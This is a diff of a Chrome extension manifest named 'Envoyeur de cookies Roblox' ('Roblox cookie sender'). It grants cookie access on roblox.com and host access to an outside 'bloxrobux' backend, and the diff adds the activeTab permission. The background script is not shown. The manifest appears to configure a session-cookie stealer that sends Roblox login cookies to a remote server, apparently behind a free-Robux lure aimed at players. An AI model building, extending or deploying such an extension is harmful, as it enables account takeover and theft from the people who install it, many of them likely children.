@@ -2,21 +2,18 @@
   "manifest_version": 3,
   "name": "Envoyeur de cookies Roblox",
   "version": "1.0",
-
   "permissions": [
     "cookies",
-    "notifications"
+    "notifications",
+    "activeTab"
   ],
-
   "host_permissions": [
     "https://*.roblox.com/*",
     "https://bloxrobux-backend.onrender.com/*"
   ],
-
   "background": {
     "service_worker": "background.js"
   },
-
   "action": {
     "default_title": "Envoyer les cookies Roblox"
   }
